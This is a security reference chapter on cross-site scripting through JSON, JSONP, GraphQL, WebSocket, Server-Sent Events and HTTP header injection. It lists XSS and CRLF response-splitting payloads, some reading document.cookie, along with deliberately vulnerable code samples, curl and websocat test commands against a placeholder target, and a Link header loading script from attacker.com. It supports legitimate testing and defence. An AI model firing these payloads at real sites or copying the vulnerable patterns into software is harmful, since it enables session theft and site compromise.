# 24 - JSON, API & Header XSS

## Overview

Modern web applications are API-driven, with frontends consuming JSON from REST APIs, GraphQL endpoints, WebSocket connections, and Server-Sent Events. XSS vulnerabilities in these contexts differ from traditional reflected/stored XSS because the injection point is often an API response that the frontend renders, rather than a directly reflected HTML page. HTTP header injection creates another attack surface where response headers are manipulated to inject content or alter browser behavior.

**Sources**: [Rapid7 - XSS in JSON](https://www.rapid7.com/blog/post/2022/05/04/xss-in-json-old-school-attacks-for-modern-applications/), [Invicti - JSON Injection](https://www.invicti.com/learn/json-injection), [Escape.tech - GraphQL XSS](https://escape.tech/blog/cross-site-scripting-xss-in-graphql/)

---

## 1. JSON Injection XSS

### 1.1 Reflected JSON Response Injection

When user input is embedded directly into a JSON response and that response is rendered by a frontend framework, XSS can occur.

**Vulnerable Pattern (Server):**
```python
# Server returns user input in JSON
@app.route('/api/search')
def search():
    query = request.args.get('q')
    return jsonify({"query": query, "results": []})
```

**Vulnerable Pattern (Client - unsafe rendering):**
```javascript
// Frontend renders without sanitization using innerHTML
fetch('/api/search?q=' + userInput)
  .then(r => r.json())
  .then(data => {
    document.getElementById('search-term').innerHTML = data.query; // VULNERABLE
  });
```

**Attack**: `https://target.com/api/search?q=<img src=x onerror=alert(1)>`

The JSON itself is safe (properly escaped by `jsonify`), but the frontend uses `.innerHTML` to render the value, creating a DOM-based XSS.

### 1.2 Content-Type Sniffing (JSON Served as HTML)

When a server returns JSON without proper `Content-Type` headers, or when the `X-Content-Type-Options: nosniff` header is absent, browsers may MIME-sniff the response and render it as HTML.

**Vulnerable scenario:**
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"name": "<script>alert(1)</script>", "role": "admin"}
```

With proper `Content-Type: application/json`, browsers will not render this as HTML. However:
- If the server returns `Content-Type: text/html` by mistake
- If no `Content-Type` header is set
- If an older browser performs MIME sniffing despite `application/json`

The response body renders as HTML and the script executes.

**Testing technique**: Force the server to return a different Content-Type via parameter pollution or Accept header manipulation:
```
GET /api/user?callback=<script>alert(1)</script>&format=html
```

**Source**: [Invicti - JSON Injection](https://www.invicti.com/learn/json-injection)

### 1.3 JSONP Callback Injection

JSONP (JSON with Padding) wraps JSON data in a callback function. If the callback name is user-controlled, XSS is possible:

**Vulnerable endpoint:**
```http
GET /api/data?callback=myFunction
Response: myFunction({"data": "value"})
```

**Attack:**
```http
GET /api/data?callback=alert(document.domain)//
Response: alert(document.domain)//({"data": "value"})
```

The `//` comments out the rest, and the response is served with `Content-Type: application/javascript` or `text/javascript`, causing the browser to execute the injected function.

**Advanced JSONP payloads:**
```
?callback=alert(1)//
?callback=alert(document.cookie)//
?callback=<script>alert(1)</script>
?callback=jQuery31104498484498544_callback%0d%0a<script>alert(1)</script>
?callback=angular.callbacks._0
```

**CSP Bypass via JSONP**: JSONP endpoints on whitelisted domains can be abused to bypass Content Security Policy:
```html
<script src="https://trusted-domain.com/api/data?callback=alert(document.domain)//"></script>
```

The JSONBee project catalogs JSONP endpoints on popular domains suitable for CSP bypass.

**Source**: [Security Cafe - Practical JSONP Injection](https://securitycafe.ro/2017/01/18/practical-jsonp-injection/), [HackerOne Report #259100](https://hackerone.com/reports/259100), [HackerOne Report #361951](https://hackerone.com/reports/361951), [JSONBee - JSONP CSP Bypass](https://github.com/zigoo0/JSONBee)

### 1.4 JSON Key Injection Rendered in UI

When JSON keys (not just values) are rendered in the frontend, injecting XSS payloads into key names is effective:

```json
{
  "username": "attacker",
  "<img src=x onerror=alert(1)>": "injected_key",
  "role": "user"
}
```

If the frontend iterates over keys for display (e.g., rendering a settings page or debug view):
```javascript
Object.keys(data).forEach(key => {
  container.innerHTML += '<tr><td>' + key + '</td><td>' + data[key] + '</td></tr>';
});
```

### 1.5 GraphQL Response Injection

GraphQL's flexible query structure creates multiple XSS surfaces:

**Reflected XSS via error messages:**
```graphql
query {
  user(id: "<img src=x onerror=alert(1)>") {
    name
  }
}
```

If the GraphQL server reflects the invalid input in error messages and the frontend renders those errors unsafely:
```json
{
  "errors": [{
    "message": "User not found: <img src=x onerror=alert(1)>",
    "path": ["user"]
  }]
}
```

**Stored XSS via mutations:**
```graphql
mutation {
  updateProfile(input: {
    bio: "<script>alert(document.domain)</script>"
  }) {
    bio
  }
}
```

If the `bio` field is rendered in other users' views without sanitization, this becomes stored XSS.

**GraphiQL/Playground XSS**: The introspection schema itself can contain XSS payloads in type descriptions. GraphiQL had a documented vulnerability where schema descriptions were rendered as raw HTML.

**Source**: [Escape.tech - XSS in GraphQL](https://escape.tech/blog/cross-site-scripting-xss-in-graphql/), [Payatu - GraphQL Exploitation Part 3](https://payatu.com/blog/graphql-exploitation-part-3/), [GraphiQL Introspection Schema XSS](https://github.com/graphql/graphiql/blob/main/docs/security/2021-introspection-schema-xss.md)

---

## 2. API-Driven XSS

### 2.1 REST API Response Rendered in Frontend

The most common modern XSS pattern: API returns data, frontend renders it unsafely.

**Vulnerable rendering patterns across frameworks:**

| Framework | Unsafe Method (Enables XSS) | Safe Alternative |
|-----------|----------------------------|------------------|
| Vanilla JS | `element.innerHTML = data` | `element.textContent = data` |
| React | `dangerouslySetInnerHTML={{__html: data}}` | Default JSX `{data}` escaping |
| Vue | `v-html="data"` | `v-text` or `{{ data }}` interpolation |
| Angular | `bypassSecurityTrustHtml(data)` | Default sanitization |
| jQuery | `$(el).html(data)` | `$(el).text(data)` |
| Handlebars | `{{{ triple-stash }}}` | `{{ double-stash }}` |
| EJS | `<%- unescaped %>` | `<%= escaped %>` |

**Testing approach:**
1. Identify all API endpoints that return user-controlled data
2. Trace how each field is rendered in the frontend (view source, browser DevTools)
3. Inject HTML/JS payloads via the API
4. Verify if the frontend sanitizes before rendering

### 2.2 WebSocket Message Injection

WebSocket connections transmit real-time data that is often rendered directly in the DOM (chat applications, notifications, dashboards).

**Vulnerable pattern:**
```javascript
ws.onmessage = function(event) {
  const data = JSON.parse(event.data);
  chatBox.innerHTML += '<div class="message"><span class="user">'
    + data.username + '</span>: ' + data.message + '</div>';
};
```

**Attack**: Send a WebSocket message with an XSS payload:
```json
{"username": "attacker", "message": "<img src=x onerror=alert(document.cookie)>"}
```

**Testing WebSocket XSS:**
```javascript
// Browser console injection
const ws = new WebSocket('wss://target.com/ws');
ws.onopen = () => {
  ws.send(JSON.stringify({
    type: 'message',
    content: '<svg onload=alert(1)>'
  }));
};
```

Or use tools like `websocat` or Burp Suite's WebSocket interception.

### 2.3 Server-Sent Events (SSE) Injection

SSE streams data from server to client. If event data contains unsanitized user input:

**Server-side:**
```python
@app.route('/events')
def events():
    def generate():
        yield f"data: {user_controlled_input}\n\n"
    return Response(generate(), mimetype='text/event-stream')
```

**Client-side (vulnerable):**
```javascript
const source = new EventSource('/events');
source.onmessage = function(event) {
  document.getElementById('feed').innerHTML += event.data; // VULNERABLE
};
```

**Attack**: Inject HTML via the SSE data field. The `data:` prefix in SSE is purely protocol-level and does not affect how the client processes the content.

### 2.4 API Error Message Reflection

APIs frequently reflect user input in error messages:

```http
GET /api/v1/users/"><script>alert(1)</script>
```

```json
{
  "error": "Invalid user ID: \"><script>alert(1)</script>",
  "status": 400
}
```

If the frontend displays error messages using `.innerHTML` or equivalent, this creates reflected XSS through the API layer.

**Common error reflection points:**
- Invalid parameter values in validation messages
- 404 paths reflected in "resource not found" messages
- Authentication error messages reflecting usernames
- Search queries reflected in "no results for X" messages

---

## 3. HTTP Header Injection XSS

### 3.1 Response Header Injection Leading to XSS

HTTP response splitting occurs when user input containing CRLF characters (`\r\n`) is included in response headers, allowing injection of arbitrary headers or even a second response body:

**Vulnerable code:**
```python
@app.route('/redirect')
def redirect():
    url = request.args.get('url')
    response = make_response('', 302)
    response.headers['Location'] = url  # No CRLF filtering
    return response
```

**Attack:**
```
GET /redirect?url=http://example.com%0d%0aContent-Type:%20text/html%0d%0aX-XSS-Protection:%200%0d%0a%0d%0a<script>alert(1)</script>
```

This injects:
```http
HTTP/1.1 302 Found
Location: http://example.com
Content-Type: text/html
X-XSS-Protection: 0

<script>alert(1)</script>
```

**Source**: [OWASP - HTTP Response Splitting](https://owasp.org/www-community/attacks/HTTP_Response_Splitting), [Sourcery - HTTP Response Splitting](https://www.sourcery.ai/vulnerabilities/http-response-splitting)

### 3.2 Link Header Injection

The `Link` HTTP header can preload resources. If user input is reflected in this header:

```http
Link: <https://attacker.com/malicious.js>; rel=preload; as=script
```

This instructs the browser to preload and potentially execute a malicious script resource, bypassing CSP in some configurations if the domain is whitelisted.

### 3.3 Content-Disposition Filename Injection

When file download endpoints reflect user input in the `Content-Disposition` header:

**Vulnerable code:**
```python
filename = request.args.get('name')
response.headers['Content-Disposition'] = f'attachment; filename="{filename}"'
```

**Attack (response splitting via filename):**
```
GET /download?name=file.txt"%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>"
```

If CRLF characters pass through, the attacker injects a new response body with `Content-Type: text/html`, causing the browser to render the payload as HTML instead of downloading a file.

**Source**: [MarkItZeroDay - Defeating Content-Disposition](https://markitzeroday.com/xss/bypass/2018/04/17/defeating-content-disposition.html), [CAPEC-86 XSS Through HTTP Headers](https://capec.mitre.org/data/definitions/86.html)

### 3.4 Custom Header Reflection in Error Pages

Web servers and reverse proxies sometimes reflect custom headers in error pages:

```http
GET / HTTP/1.1
Host: target.com
X-Custom-Header: <script>alert(1)</script>
```

If the server generates a 400/500 error page that includes the header value:
```html
<html><body>
  <h1>Bad Request</h1>
  <p>Invalid header value: <script>alert(1)</script></p>
</body></html>
```

**Common reflection points:**
- `X-Forwarded-For` in access denied pages
- `Referer` in error logs displayed via admin panels
- `User-Agent` in analytics dashboards
- Custom `X-*` headers in debug/diagnostic pages

---

## 4. Content Negotiation and API Versioning Exploitation

### 4.1 Content Negotiation Exploitation

APIs that support multiple response formats via Accept headers or format parameters can be tricked:

```
GET /api/users/1?format=xml
Accept: text/html
```

If the server respects the Accept header over the format parameter (or vice versa), it might return XML/JSON content with an HTML Content-Type, enabling XSS.

### 4.2 API Versioning and Legacy Endpoints

Older API versions often lack security controls present in newer versions:
```
/api/v1/search?q=<script>alert(1)</script>  # Vulnerable legacy endpoint
/api/v3/search?q=<script>alert(1)</script>  # Properly escaped
```

Always test all API versions, not just the current one.

---

## 5. JSON/API/Header XSS Payloads

### JSON Context Payloads

```javascript
// 1. JSON value injection (rendered via innerHTML)
{"name": "<img src=x onerror=alert(1)>"}

// 2. JSON breaking out of string context
{"name": "value\"},\"injected\":\"<script>alert(1)</script>"}

// 3. JSON Unicode escape bypass
{"name": "\u003cscript\u003ealert(1)\u003c/script\u003e"}

// 4. JSONP callback injection
?callback=alert(document.domain)//

// 5. JSONP callback with HTML
?callback=<script>alert(1)</script><!--
```

### API Context Payloads

```javascript
// 6. GraphQL error reflection
query { user(id: "<img src=x onerror=alert(1)>") { name } }

// 7. GraphQL mutation stored XSS
mutation { updateBio(text: "<svg onload=alert(document.domain)>") { id } }

// 8. WebSocket message injection
{"type":"chat","msg":"<img src=x onerror=alert(document.cookie)>"}

// 9. SSE data injection
data: <svg onload=alert(1)>

// 10. REST API path injection for error reflection
GET /api/users/<img/src=x onerror=alert(1)>
```

### Header Injection Payloads

```http
# 11. CRLF injection in Location header
GET /redirect?url=http://x%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>

# 12. Content-Disposition filename CRLF
GET /download?name=file.txt"%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>"

# 13. Referer header reflection
Referer: <script>alert(1)</script>

# 14. User-Agent reflection in error/admin pages
User-Agent: <img src=x onerror=alert(1)>

# 15. X-Forwarded-For header in access denied pages
X-Forwarded-For: <svg onload=alert(1)>

# 16. Host header injection
Host: attacker.com"><script>alert(1)</script>
```

---

## 6. Testing Methodology

### Step 1: Map API Surface
- Enumerate all API endpoints (REST, GraphQL, WebSocket, SSE)
- Identify response formats (JSON, XML, HTML, JSONP)
- Note Content-Type headers for each endpoint
- Check for JSONP support (try `?callback=test`, `?jsonp=test`)

### Step 2: Trace Data Flow
- Track how API responses are rendered in the frontend
- Search frontend code for innerHTML, v-html, and other unsafe rendering methods
- Identify all error message rendering paths
- Map WebSocket message handlers and SSE event listeners

### Step 3: Test JSON/API Injection
- Inject HTML/JS payloads in all user-controlled fields
- Test JSONP callback parameters with JavaScript payloads
- Fuzz GraphQL queries with XSS payloads in arguments and variables
- Send XSS payloads via WebSocket messages

### Step 4: Test Header Injection
- Inject CRLF sequences (`%0d%0a`) in all parameters reflected in headers
- Test `Location`, `Set-Cookie`, `Content-Disposition` headers
- Check if custom headers are reflected in error pages
- Test `Host`, `X-Forwarded-For`, `Referer`, `User-Agent` reflection

### Step 5: Verify Content-Type Behavior
- Check for `X-Content-Type-Options: nosniff` header
- Test if JSON endpoints can be forced to return HTML Content-Type
- Verify JSONP endpoints set proper Content-Type
- Test content negotiation via Accept header manipulation

---

## 7. Tools

```bash
# Find JSONP endpoints
curl -s "https://target.com/api/data?callback=test" | head -20

# Test CRLF injection
curl -v "https://target.com/redirect?url=http://x%0d%0aInjected-Header:true"

# WebSocket testing with websocat
echo '{"msg":"<img src=x onerror=alert(1)>"}' | websocat wss://target.com/ws

# GraphQL XSS testing
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ user(id:\"<img src=x onerror=alert(1)>\") { name } }"}'

# Enumerate JSONP parameters
for param in callback jsonp cb jsonpcallback func; do
  curl -s "https://target.com/api/data?${param}=testXSS" | grep -i "testXSS"
done
```
